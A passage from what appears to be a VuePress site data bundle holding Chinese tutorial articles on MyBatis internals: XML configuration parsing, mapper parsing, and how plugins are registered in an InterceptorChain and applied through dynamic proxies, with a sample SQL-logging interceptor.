类型处理器，在返回的时候使用类型处理器，处理查询返回结果的数据类型对应 java 的映射。 <resultMap> 标签可以有多个，所以会添加到集合中，然后维护到 configuration 中\n\n<select> or <insert> 这里最主要的部分就是在解析完成后会把 namespace.id 做为 key ，把解析的信息 MappedStatement 做为 value ，维护到 configuration 中，以便 Mybatis 在被代理类调用方法的时候快速找到，该方法对应的 SQL 信息等\n\n# plugins 插件解析\n\n# settings 设置解析\n\n\n# 准备\n\n\n# 执行',normalizedContent:'mybatis 是一个 java 的 orm 框架，它使用 xml 或注解来配置和映射 sql 语句，同时提供了增删改查等常用操作的 api。mybatis 还提供了许多高级映射和查询功能，例如延迟加载、缓存和批量操作，这使得开发人员可以轻松地编写出高性能、可维护的数据访问层。\n\n关于 mybatis 我们主要要了解他的工作流程，特性，和部分重要的知识点，就像 spring，我们主要是了解他的生命周期，可扩展项等，所谓生命周期，也是 spring 的工作流程。\n\n以下是整个 mybatis 的工作流程图，对应图中会讲解每个节点重要的知识点。这里要记住 mybatis 主要的工作模式就是解析、准备和执行，所谓解析就是得到 xml 的信息，维护到一个叫 configuration 的配置类中；准备就是 opensession 部分，他会得到 configuration 中的信息，根据执行部分所使用的执行器，数据源，事务等进行实例化和关系映射；使用就是当我们去进行查询或新增等操作，从资源和信息中拿取已被缓存的对象或执行器等，执行对应的方法。\n\n\n\n\n# 解析\n\n解析部分对应图中 加载&解析xml 至 xmlconfigbuilder#mapperelement 这里，可以说是读取 xml 到维护各类对象关系和信息的核心。下面我们分解讲解每个步骤都做了哪些事情以及核心部分解析得到了什么。\n\n\n# 加载 & 解析 xml\n\n这部分主要是读取 mybatis-config-datasource.xml 文件，该文件主要维护了一些公共资源信息，包括环境信息（数据库连接信息），对应的 mapper 文件信息，设置信息等。\n\n<?xml version="1.0" encoding="utf-8"?>\n<!doctype configuration public "-//mybatis.org//dtd config 3.0//en"\n        "http://mybatis.org/dtd/mybatis-3-config.dtd">\n<configuration>\n    \x3c!-- 设置信息 --\x3e\n    <settings>\n        \x3c!-- 全局缓存：true/false 管理一级缓存和二级缓存的是否使用 --\x3e\n        <setting name="cacheenabled" value="true"/>\n        \x3c!--缓存级别：session/statement--\x3e\n        <setting name="localcachescope" value="statement"/>\n    </settings>\n    \x3c!-- 环境信息 --\x3e\n    <environments default="development">\n        <environment id="development">\n            <transactionmanager type="jdbc"/>\n            <datasource type="pooled">\n                <property name="driver" value="com.mysql.jdbc.driver"/>\n                <property name="url" value="jdbc:mysql://10.240.30.93:3306/test?useunicode=true&amp;characterencoding=utf8&amp;usessl=false"/>\n                <property name="username" value="root"/>\n                <property name="password" value="dev@root2021"/>\n            </datasource>\n        </environment>\n    </environments>\n    \x3c!-- 维护所有mapper --\x3e\n    <mappers>\n        \x3c!-- xml 配置 --\x3e\n        <mapper resource="mapper/activity_mapper.xml"/>\n    </mappers>\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n读取到文件后调用 xmlconfigbuilder#parse 进行解析，解析内容如下。\n\n# configuration 初始化配置\n\n在整个文件解析之前，mybatis 会先把一些信息进行提前初始化，也就是上图中 new configuration（） 阶段，该类最终会被多个 mybatis 的类所引用并贯穿整个 mybatis 工作流程，由于被引用的类太多，这里就不一一列举，我们只要知道他贯穿整个流程即可。\n\n\n\nconfiguration 被初始化时包含了大量的信息，这些信息就是在解析 xml 文件时维护的，逐一讲解下每个配置的具体作用：\n\n * environment：缓存了环境 id（可设置默认环境，环境包括：开发环境、测试环境等），事务工厂，数据源（有池或无池或其他连接池）等\n * mapperregistry：映射注册机，缓存每个接口（ 接口对象class做为key ）所对应的 mapperproxyfactory ，提供添加映射代理类和获取代理类\n * mappedstatements：缓存 sql 语句的拆解信息。xml 的 namespace.标签id做为（key） ，value 为 mappedstatement，信息包括： mapper路径 ， sql类型（select|insert等） ， sql语句 ， 条件 ， 该条语句的缓存信息 ， 返回结果对象 ， 是否缓存标志 等。\n * resultmaps：缓存 resultmap 标签的拆解信息。xml 的 namespace.resultmap做为（key） ，然后对应 value 存放 sql字段，映射对象字段，字段java数据类型，类型对应的执行器 等\n * interceptorchain：缓存 plugins 标签的拆解信息。会在执行 newparameterhandler，newresultsethandler，newstatementhandler，newexecutor 进行拦截。\n * typealiasregistry：缓存了每个 java 基本类型的封装类，以及 jdbctransactionfactory，druiddatasourcefactory，unpooleddatasourcefactory，pooleddatasourcefactory，perpetualcache，fifocache 等 mybatis 提供的已知类，用于快速解析 xml 描述的值，便于快速得到 class 信息并获取实例。\n * typehandlerregistry：存放对应数据类型的处理策略，比如 java 类型，对应 sql 类型的处理策略，或 java 类型对应的处理策略。用于设置 sql 语句参数和获取查询结果的数据类型转换策略。\n * objectfactory：对象工厂，用于创建对象实例，使用反射。\n * objectwrapperfactory：对象包装器，放着，被解析对象的实例，以及对应的 set，get，构造器，类型等信息。 objectfactory 与 objectwrapperfactory 是为 metaobject 提供支持的，以解析对象信息进行，然后获取对象某个特定属性的数据，缓存是为了加快获取速度，如果属性也是一个对象则会递归缓存，获取值也会递归获取。\n * loadedresources：存放已被加载的 mapper.xml 文件，以防止重复加载\n * languageregistry：存放默认的语言解析驱动器，比如存放了 xmllanguagedriver ，提供快速获取这个解析器，然后提供 sql 解析。\n * cacheenabled：解析是否启用缓存，该配置对于二级缓存生效，一次缓存是默认缓存。\n * localcachescope：一级缓存，缓存策略默认是永久缓存，缓存方式分为 session 和 statement ， session 在该会话中命中相同 sql 语句和条件，若在该 session 中发生 insert/update/delete/commit/rollback/close 则会清除缓存，但是，并不会影响其它会话中的缓存； statement ，只针对当前会话执行的这一语句有效，执行完毕查询会立即清除缓存。\n * caches：二级缓存，基于 namespace 的缓存，可提供第三方其他方式实现。\n\n# environments 环境解析\n\n在环境解析过程中会得到下面几个重要的属性：\n\n * id：表明使用哪一个环境做为主要环境配置，解析 xml 中的 <environment > 标签\n * transactionfactory：解析 xml 中的 <transactionmanager> 的 type 属性，如果是 jdbc 则就是 jdbctransactionfactory ，也可以自行设置，需要自己注册到 typealiasregistry 中\n * datasourcefactory：解析 xml 中 <datasource> 的 type 属性，如果是 pooled ，则对应 pooleddatasourcefactory ， unpooled 对应 unpooleddatasourcefactory ， druid 对应 druiddatasourcefactory\n * datasource：解析 xml 中 <property> 得到具体的连接信息，从 datasourcefactory 中获取 datasource\n\n当以上的信息组件完毕后会封装到 environment 中，然后添加到 configuration\n\n# mapper 解析\n\n在 mapper 解析中有两种不同的解析，一个是我们常见的 xml 解析，一种是注解，如 @select，这里只讲 xml 解析，有关 @select 等注解解析，放在后续专开一章。那解析首先会读取所到所有的 mapper，在分别解析每个 mapper\n\n<mappers>\n    \x3c!-- xml 配置 --\x3e\n    <mapper resource="mapper/activity_mapper.xml"/>\n</mappers>\n\n\n1\n2\n3\n4\n\n\n一个完整的 mapper 大致包含如下信息，所以内部会有多个解析分别解析，如 cache 解析，resultmap 解析，select 解析，insert 解析等，我们这里说下重要的解析对象和作用即可。\n\n<mapper namespace="cn.bugstack.mybatis.test.dao.iactivitydao">\n    <cache eviction="fifo" flushinterval="600000" size="512" readonly="true"/>\n    <resultmap id="activitymap" type="cn.bugstack.mybatis.test.po.activity">\n        <id column="id" property="id"/>\n        <result column="activity_id" property="activityid"/>\n        <result column="activity_name" property="activityname"/>\n        <result column="activity_desc" property="activitydesc"/>\n        <result column="create_time" property="createtime"/>\n        <result column="update_time" property="updatetime"/>\n    </resultmap>\n    <select id="queryactivitybyid" parametertype="cn.bugstack.mybatis.test.po.activity" resultmap="activitymap" flushcache="false" usecache="true">\n        select activity_id, activity_name, activity_desc, create_time, update_time\n        from activity\n        <trim prefix="where" prefixoverrides="and | or" suffixoverrides="and">\n            <if test="null != activityid">\n                activity_id = #{activityid}\n            </if>\n        </trim>\n    </select>\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n<cache > 标签配置于二级缓存，对于缓存也会有单独的一章讲解，这里只讲解析得到的重要类及作用，通过标签会封装一个 cache 对象，该对象以 namespace 做为 cache 的 id ，并把 cache 对象添加到 configuration 中\n\n<resultmap> 标签配置一个 <select > 标签的 resultmap 属性返回结果对象的关系映射，他会得到对象以及得到描述的各 java 属性类型和对应的 typehandler 类型处理器，在返回的时候使用类型处理器，处理查询返回结果的数据类型对应 java 的映射。 <resultmap> 标签可以有多个，所以会添加到集合中，然后维护到 configuration 中\n\n<select> or <insert> 这里最主要的部分就是在解析完成后会把 namespace.id 做为 key ，把解析的信息 mappedstatement 做为 value ，维护到 configuration 中，以便 mybatis 在被代理类调用方法的时候快速找到，该方法对应的 sql 信息等\n\n# plugins 插件解析\n\n# settings 设置解析\n\n\n# 准备\n\n\n# 执行',charsets:{cjk:!0}},{title:"核心功能拆解 Plugin插件功能实现",frontmatter:{title:"核心功能拆解 Plugin插件功能实现",date:"2023-06-25T09:22:36.000Z",permalink:"/mybatis/mybatis/301/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/02.Mybatis/31.mybatis/301.%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD%E6%8B%86%E8%A7%A3%20Plugin%E6%8F%92%E4%BB%B6%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0.html",relativePath:"01.框架/02.Mybatis/31.mybatis/301.核心功能拆解 Plugin插件功能实现.md",key:"v-7bea548f",path:"/mybatis/mybatis/301/",headers:[{level:2,title:"解析",slug:"解析",normalizedTitle:"解析",charIndex:38},{level:2,title:"注册",slug:"注册",normalizedTitle:"注册",charIndex:42},{level:2,title:"执行",slug:"执行",normalizedTitle:"执行",charIndex:46},{level:2,title:"自定义",slug:"自定义",normalizedTitle:"自定义",charIndex:5721}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"解析 注册 执行 自定义",content:'Mybatis Plugin 是随着 Mybatis 的工作流程一起被进行 解析->注册->执行 的，了解每个步骤才能更好的对 Mybatis 所提供的 Plugin 机制进行实现和扩展。在我们已知的 Mybatis 的插件有分页插件、缓存插件等，之所以可以能做到扩展是因为他在自己本身的 Executor（生产执行器） ， StatementHandler（语句处理器） ， ParameterHandler（参数处理器） ， ResultSetHandler（结果集处理器） 这四个地方做了拦截，当介绍到执行步骤的时候就可以看到具体实现。\n\n\n# 解析\n\n常规的 XML 配置\n\n<plugins>\n    <plugin interceptor="cn.mybatis.test.plugin.TestPlugin">\n        <property name="test00" value="100"/>\n        <property name="test01" value="200"/>\n    </plugin>\n</plugins>\n\n\n1\n2\n3\n4\n5\n6\n\n\n核心解析方法\n\nprivate void pluginElement(Element parent) throws Exception {\n    if (parent == null) return;\n    List<Element> elements = parent.elements();\n    for (Element element : elements) {\n        // 解析类路径\n        String interceptor = element.attributeValue("interceptor");\n        // 参数配置\n        Properties properties = new Properties();\n        List<Element> propertyElementList = element.elements("property");\n        for (Element property : propertyElementList) {\n            properties.setProperty(property.attributeValue("name"), property.attributeValue("value"));\n        }\n        // 获取插件实现类并实例化：cn.mybatis.test.plugin.TestPlugin \n        // 通过 Resources.classForName(string) 获取实例\n        Interceptor interceptorInstance = (Interceptor) resolveClass(interceptor).newInstance();\n        // 设置配置属性\n        interceptorInstance.setProperties(properties);\n        // 注册到 configuration 中\n        configuration.addInterceptor(interceptorInstance);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 注册\n\n解析的时候会在方法内部执行 configuration.addInterceptor(interceptorInstance); 这一步是把插件维护到 Configuration 全局配置中，但插件其实应该有很多各，所以提供的是一个 InterceptorChain 对象由 Configuration 维护\n\npublic class Configuration {\n    // 插件拦截器链\n    protected final InterceptorChain interceptorChain = new InterceptorChain();\n    public void addInterceptor(Interceptor interceptorInstance) {\n        interceptorChain.addInterceptor(interceptorInstance);\n    }\n    // other 其他配置\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nInterceptorChain 里面维护的是一个集合，专门存放所有的 Plugin\n\npublic class InterceptorChain {\n    // 插件拦截器容器\n    private final List<Interceptor> interceptors = new ArrayList<>();\n    //\n    public Object pluginAll(Object target) {\n        for (Interceptor interceptor : interceptors) {\n            target = interceptor.plugin(target);\n        }\n        return target;\n    }\n    // 添加到插件容器\n    public void addInterceptor(Interceptor interceptor) {\n        interceptors.add(interceptor);\n    }\n    public List<Interceptor> getInterceptors(){\n        return Collections.unmodifiableList(interceptors);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n从解析到注册这两步就可以看出，MyBatis 是把插件以拦截器的形式存放到一个拦截器容器里，这个容器是 Configuration 全局配置类来进行维护的\n\n\n# 执行\n\n执行是在调用具体的查询方法活其他在 Mybatis 里所描述的 SQL 方法时进行的触发，触发会在如下代码中的位置中触发。\n\n  // 创建参数处理器\n  public ParameterHandler newParameterHandler(MappedStatement mappedStatement, Object parameterObject, BoundSql boundSql) {\n    ParameterHandler parameterHandler = mappedStatement.getLang().createParameterHandler(mappedStatement, parameterObject, boundSql);\n    parameterHandler = (ParameterHandler) interceptorChain.pluginAll(parameterHandler);\n    return parameterHandler;\n  }\n \n  // 创建结果集处理器\n  public ResultSetHandler newResultSetHandler(Executor executor, MappedStatement mappedStatement, RowBounds rowBounds, ParameterHandler parameterHandler,\n      ResultHandler resultHandler, BoundSql boundSql) {\n    ResultSetHandler resultSetHandler = new DefaultResultSetHandler(executor, mappedStatement, parameterHandler, resultHandler, boundSql, rowBounds);\n    resultSetHandler = (ResultSetHandler) interceptorChain.pluginAll(resultSetHandler);\n    return resultSetHandler;\n  }\n \n  // 创建语句处理器\n  public StatementHandler newStatementHandler(Executor executor, MappedStatement mappedStatement, Object parameterObject, RowBounds rowBounds, ResultHandler resultHandler, BoundSql boundSql) {\n    StatementHandler statementHandler = new RoutingStatementHandler(executor, mappedStatement, parameterObject, rowBounds, resultHandler, boundSql);\n    statementHandler = (StatementHandler) interceptorChain.pluginAll(statementHandler);\n    return statementHandler;\n  }\n\n  // 生产执行器\n  public Executor newExecutor(Transaction transaction, ExecutorType executorType) {\n    executorType = executorType == null ? defaultExecutorType : executorType;\n    executorType = executorType == null ? ExecutorType.SIMPLE : executorType;\n    Executor executor;\n    if (ExecutorType.BATCH == executorType) {\n      // 批量处理器\n      executor = new BatchExecutor(this, transaction);\n    } else if (ExecutorType.REUSE == executorType) {\n      executor = new ReuseExecutor(this, transaction);\n    } else {\n      // 简单处理器\n      executor = new SimpleExecutor(this, transaction);\n    }\n    // 二级缓存处理器\n    if (cacheEnabled) {\n      executor = new CachingExecutor(executor);\n    }\n    executor = (Executor) interceptorChain.pluginAll(executor);\n    return executor;\n  }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n会看到他会调用 InterceptorChain#pluginAll 方法，该类在注册步骤中有提及到，里面维护了所有的插件，那么在这里就会时循环所有的插件，每个插件调用 Interceptor#plugin\n\n// 循环调用\npublic Object pluginAll(Object target) {\n    for (Interceptor interceptor : interceptors) {\n        target = interceptor.plugin(target);\n    }\n    return target;\n}\n\n// 执行wrap\npublic interface Interceptor {\n    // 拦截，使用方实现\n    Object intercept(Invocation invocation) throws Throwable;\n    // 代理\n    default Object plugin(Object target) {\n        return Plugin.wrap(target, this);\n    }\n    // 设置属性\n    default void setProperties(Properties properties) {\n        // NOP\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nInterceptor#plugin 方法内部也就是调用 Plugin#wrap 静态方法，该方法通过获取自定义插件的注解，来观察你需要对哪个处理器，哪个方法以及参数类型去匹配拦截对象的具体方法，如果多一个参数都可能找不到要拦截的方法。找到方法后然后去动态代理这个方法。\n\n// \npublic class Plugin implements InvocationHandler {\n    private Object target;\n    private Interceptor interceptor;\n    private Map<Class<?>, Set<Method>> signatureMap;\n\n    private Plugin(Object target, Interceptor interceptor, Map<Class<?>, Set<Method>> signatureMap) {\n        this.target = target;\n        this.interceptor = interceptor;\n        this.signatureMap = signatureMap;\n    }\n    // 具体的代理实现\n    @Override\n    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n        // 获取声明的方法列表\n        Set<Method> methods = signatureMap.get(method.getDeclaringClass());\n        // 过滤需要拦截的方法\n        if (methods != null && methods.contains(method)) {\n            // 调用 Interceptor#intercept 插入自己的反射逻辑\n            return interceptor.intercept(new Invocation(target, method, args));\n        }\n        return method.invoke(target, args);\n    }\n    /**\n     * 用代理把自定义插件行为包裹到目标方法中，也就是 Plugin.invoke 的过滤调用\n     */\n    public static Object wrap(Object target, Interceptor interceptor) {\n        // 取得签名Map\n        Map<Class<?>, Set<Method>> signatureMap = getSignatureMap(interceptor);\n        // 取得要改变行为的类(ParameterHandler|ResultSetHandler|StatementHandler|Executor)\n        Class<?> type = target.getClass();\n        // 取得接口\n        Class<?>[] interfaces = getAllInterfaces(type, signatureMap);\n        // 创建代理(StatementHandler)\n        if (interfaces.length > 0) {\n            // 代理\n            return Proxy.newProxyInstance(\n                    type.getClassLoader(),\n                    interfaces,\n                    new Plugin(target, interceptor, signatureMap));\n        }\n        return target;\n    }\n    /**\n     * 获取方法签名组 Map\n     */\n    private static Map<Class<?>, Set<Method>> getSignatureMap(Interceptor interceptor) {\n        // 取 Intercepts 注解\n        Intercepts interceptsAnnotation = interceptor.getClass().getAnnotation(Intercepts.class);\n        // 必须得有 Intercepts 注解，没有报错\n        if (interceptsAnnotation == null) {\n            throw new RuntimeException("No @Intercepts annotation was found in interceptor " + interceptor.getClass().getName());\n        }\n        // value是数组型，Signature的数组\n        Signature[] sigs = interceptsAnnotation.value();\n        // 每个 class 类有多个可能有多个 Method 需要被拦截\n        Map<Class<?>, Set<Method>> signatureMap = new HashMap<>();\n        for (Signature sig : sigs) {\n            Set<Method> methods = signatureMap.computeIfAbsent(sig.type(), k -> new HashSet<>());\n            try {\n                // 例如获取到方法；StatementHandler.prepare(Connection connection)、StatementHandler.parameterize(Statement statement)...\n                Method method = sig.type().getMethod(sig.method(), sig.args());\n                methods.add(method);\n            } catch (NoSuchMethodException e) {\n                throw new RuntimeException("Could not find method on " + sig.type() + " named " + sig.method() + ". Cause: " + e, e);\n            }\n        }\n        return signatureMap;\n    }\n    /**\n     * 取得接口\n     */\n    private static Class<?>[] getAllInterfaces(Class<?> type, Map<Class<?>, Set<Method>> signatureMap) {\n        Set<Class<?>> interfaces = new HashSet<Class<?>>();\n        while (type != null) {\n            for (Class<?> c : type.getInterfaces()) {\n                // 拦截 ParameterHandler|ResultSetHandler|StatementHandler|Executor\n                if (signatureMap.containsKey(c)) {\n                    interfaces.add(c);\n                }\n            }\n            type = type.getSuperclass();\n        }\n        return interfaces.toArray(new Class<?>[interfaces.size()]);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n\n\n\n# 自定义\n\npackage cn.mybatis.test.plugin;\n\nimport cn.mybatis.executor.statement.StatementHandler;\nimport cn.mybatis.mapping.BoundSql;\nimport cn..mybatis.plugin.Interceptor;\nimport cn.mybatis.plugin.Intercepts;\nimport cn.mybatis.plugin.Invocation;\nimport cn.mybatis.plugin.Signature;\n\nimport java.sql.Connection;\nimport java.util.Properties;\n\n@Intercepts({@Signature(type = StatementHandler.class, method = "prepare", args = {Connection.class})})\npublic class TestPlugin implements Interceptor {\n\n    @Override\n    public Object intercept(Invocation invocation) throws Throwable {\n        // 获取StatementHandler\n        StatementHandler statementHandler = (StatementHandler) invocation.getTarget();\n        // 获取SQL信息\n        BoundSql boundSql = statementHandler.getBoundSql();\n        String sql = boundSql.getSql();\n        // 输出SQL\n        System.out.println("拦截SQL：" + sql);\n        // 放行\n        return invocation.proceed();\n    }\n\n    @Override\n    public void setProperties(Properties properties) {\n        System.out.println("参数输出：" + properties.getProperty("test00"));\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n',normalizedContent:'mybatis plugin 是随着 mybatis 的工作流程一起被进行 解析->注册->执行 的，了解每个步骤才能更好的对 mybatis 所提供的 plugin 机制进行实现和扩展。在我们已知的 mybatis 的插件有分页插件、缓存插件等，之所以可以能做到扩展是因为他在自己本身的 executor（生产执行器） ， statementhandler（语句处理器） ， parameterhandler（参数处理器） ， resultsethandler（结果集处理器） 这四个地方做了拦截，当介绍到执行步骤的时候就可以看到具体实现。\n\n\n# 解析\n\n常规的 xml 配置\n\n<plugins>\n    <plugin interceptor="cn.mybatis.test.plugin.testplugin">\n        <property name="test00" value="100"/>\n        <property name="test01" value="200"/>\n    </plugin>\n</plugins>\n\n\n1\n2\n3\n4\n5\n6\n\n\n核心解析方法\n\nprivate void pluginelement(element parent) throws exception {\n    if (parent == null) return;\n    list<element> elements = parent.elements();\n    for (element element : elements) {\n        // 解析类路径\n        string interceptor = element.attributevalue("interceptor");\n        // 参数配置\n        properties properties = new properties();\n        list<element> propertyelementlist = element.elements("property");\n        for (element property : propertyelementlist) {\n            properties.setproperty(property.attributevalue("name"), property.attributevalue("value"));\n        }\n        // 获取插件实现类并实例化：cn.mybatis.test.plugin.testplugin \n        // 通过 resources.classforname(string) 获取实例\n        interceptor interceptorinstance = (interceptor) resolveclass(interceptor).newinstance();\n        // 设置配置属性\n        interceptorinstance.setproperties(properties);\n        // 注册到 configuration 中\n        configuration.addinterceptor(interceptorinstance);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 注册\n\n解析的时候会在方法内部执行 configuration.addinterceptor(interceptorinstance); 这一步是把插件维护到 configuration 全局配置中，但插件其实应该有很多各，所以提供的是一个 interceptorchain 对象由 configuration 维护\n\npublic class configuration {\n    // 插件拦截器链\n    protected final interceptorchain interceptorchain = new interceptorchain();\n    public void addinterceptor(interceptor interceptorinstance) {\n        interceptorchain.addinterceptor(interceptorinstance);\n    }\n    // other 其他配置\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\ninterceptorchain 里面维护的是一个集合，专门存放所有的 plugin\n\npublic class interceptorchain {\n    // 插件拦截器容器\n    private final list<interceptor> interceptors = new arraylist<>();\n    //\n    public object pluginall(object target) {\n        for (interceptor interceptor : interceptors) {\n            target = interceptor.plugin(target);\n        }\n        return target;\n    }\n    // 添加到插件容器\n    public void addinterceptor(interceptor interceptor) {\n        interceptors.add(interceptor);\n    }\n    public list<interceptor> getinterceptors(){\n        return collections.unmodifiablelist(interceptors);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n从解析到注册这两步就可以看出，mybatis 是把插件以拦截器的形式存放到一个拦截器容器里，这个容器是 configuration 全局配置类来进行维护的\n\n\n# 执行\n\n执行是在调用具体的查询方法活其他在 mybatis 里所描述的 sql 方法时进行的触发，触发会在如下代码中的位置中触发。\n\n  // 创建参数处理器\n  public parameterhandler newparameterhandler(mappedstatement mappedstatement, object parameterobject, boundsql boundsql) {\n    parameterhandler parameterhandler = mappedstatement.getlang().createparameterhandler(mappedstatement, parameterobject, boundsql);\n    parameterhandler = (parameterhandler) interceptorchain.pluginall(parameterhandler);\n    return parameterhandler;\n  }\n \n  // 创建结果集处理器\n  public resultsethandler newresultsethandler(executor executor, mappedstatement mappedstatement, rowbounds rowbounds, parameterhandler parameterhandler,\n      resulthandler resulthandler, boundsql boundsql) {\n    resultsethandler resultsethandler = new defaultresultsethandler(executor, mappedstatement, parameterhandler, resulthandler, boundsql, rowbounds);\n    resultsethandler = (resultsethandler) interceptorchain.pluginall(resultsethandler);\n    return resultsethandler;\n  }\n \n  // 创建语句处理器\n  public statementhandler newstatementhandler(executor executor, mappedstatement mappedstatement, object parameterobject, rowbounds rowbounds, resulthandler resulthandler, boundsql boundsql) {\n    statementhandler statementhandler = new routingstatementhandler(executor, mappedstatement, parameterobject, rowbounds, resulthandler, boundsql);\n    statementhandler = (statementhandler) interceptorchain.pluginall(statementhandler);\n    return statementhandler;\n  }\n\n  // 生产执行器\n  public executor newexecutor(transaction transaction, executortype executortype) {\n    executortype = executortype == null ? defaultexecutortype : executortype;\n    executortype = executortype == null ? executortype.simple : executortype;\n    executor executor;\n    if (executortype.batch == executortype) {\n      // 批量处理器\n      executor = new batchexecutor(this, transaction);\n    } else if (executortype.reuse == executortype) {\n      executor = new reuseexecutor(this, transaction);\n    } else {\n      // 简单处理器\n      executor = new simpleexecutor(this, transaction);\n    }\n    // 二级缓存处理器\n    if (cacheenabled) {\n      executor = new cachingexecutor(executor);\n    }\n    executor = (executor) interceptorchain.pluginall(executor);\n    return executor;\n  }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n会看到他会调用 interceptorchain#pluginall 方法，该类在注册步骤中有提及到，里面维护了所有的插件，那么在这里就会时循环所有的插件，每个插件调用 interceptor#plugin\n\n// 循环调用\npublic object pluginall(object target) {\n    for (interceptor interceptor : interceptors) {\n        target = interceptor.plugin(target);\n    }\n    return target;\n}\n\n// 执行wrap\npublic interface interceptor {\n    // 拦截，使用方实现\n    object intercept(invocation invocation) throws throwable;\n    // 代理\n    default object plugin(object target) {\n        return plugin.wrap(target, this);\n    }\n    // 设置属性\n    default void setproperties(properties properties) {\n        // nop\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\ninterceptor#plugin 方法内部也就是调用 plugin#wrap 静态方法，该方法通过获取自定义插件的注解，来观察你需要对哪个处理器，哪个方法以及参数类型去匹配拦截对象的具体方法，如果多一个参数都可能找不到要拦截的方法。找到方法后然后去动态代理这个方法。\n\n// \npublic class plugin implements invocationhandler {\n    private object target;\n    private interceptor interceptor;\n    private map<class<?>, set<method>> signaturemap;\n\n    private plugin(object target, interceptor interceptor, map<class<?>, set<method>> signaturemap) {\n        this.target = target;\n        this.interceptor = interceptor;\n        this.signaturemap = signaturemap;\n    }\n    // 具体的代理实现\n    @override\n    public object invoke(object proxy, method method, object[] args) throws throwable {\n        // 获取声明的方法列表\n        set<method> methods = signaturemap.get(method.getdeclaringclass());\n        // 过滤需要拦截的方法\n        if (methods != null && methods.contains(method)) {\n            // 调用 interceptor#intercept 插入自己的反射逻辑\n            return interceptor.intercept(new invocation(target, method, args));\n        }\n        return method.invoke(target, args);\n    }\n    /**\n     * 用代理把自定义插件行为包裹到目标方法中，也就是 plugin.invoke 的过滤调用\n     */\n    public static object wrap(object target, interceptor interceptor) {\n        // 取得签名map\n        map<class<?>, set<method>> signaturemap = getsignaturemap(interceptor);\n        // 取得要改变行为的类(parameterhandler|resultsethandler|statementhandler|executor)\n        class<?> type = target.getclass();\n        // 取得接口\n        class<?>[] interfaces = getallinterfaces(type, signaturemap);\n        // 创建代理(statementhandler)\n        if (interfaces.length > 0) {\n            // 代理\n            return proxy.newproxyinstance(\n                    type.getclassloader(),\n                    interfaces,\n                    new plugin(target, interceptor, signaturemap));\n        }\n        return target;\n    }\n    /**\n     * 获取方法签名组 map\n     */\n    private static map<class<?>, set<method>> getsignaturemap(interceptor interceptor) {\n        // 取 intercepts 注解\n        intercepts interceptsannotation = interceptor.getclass().getannotation(intercepts.class);\n        // 必须得有 intercepts 注解，没有报错\n        if (interceptsannotation == null) {\n            throw new runtimeexception("no @intercepts annotation was found in interceptor " + interceptor.getclass().getname());\n        }\n        // value是数组型，signature的数组\n        signature[] sigs = interceptsannotation.value();\n        // 每个 class 类有多个可能有多个 method 需要被拦截\n        map<class<?>, set<method>> signaturemap = new hashmap<>();\n        for (signature sig : sigs) {\n            set<method> methods = signaturemap.computeifabsent(sig.type(), k -> new hashset<>());\n            try {\n                // 例如获取到方法；statementhandler.prepare(connection connection)、statementhandler.parameterize(statement statement)...\n                method method = sig.type().getmethod(sig.method(), sig.args());\n                methods.add(method);\n            } catch (nosuchmethodexception e) {\n                throw new runtimeexception("could not find method on " + sig.type() + " named " + sig.method() + ". cause: " + e, e);\n            }\n        }\n        return signaturemap;\n    }\n    /**\n     * 取得接口\n     */\n    private static class<?>[] getallinterfaces(class<?> type, map<class<?>, set<method>> signaturemap) {\n        set<class<?>> interfaces = new hashset<class<?>>();\n        while (type != null) {\n            for (class<?> c : type.getinterfaces()) {\n                // 拦截 parameterhandler|resultsethandler|statementhandler|executor\n                if (signaturemap.containskey(c)) {\n                    interfaces.add(c);\n                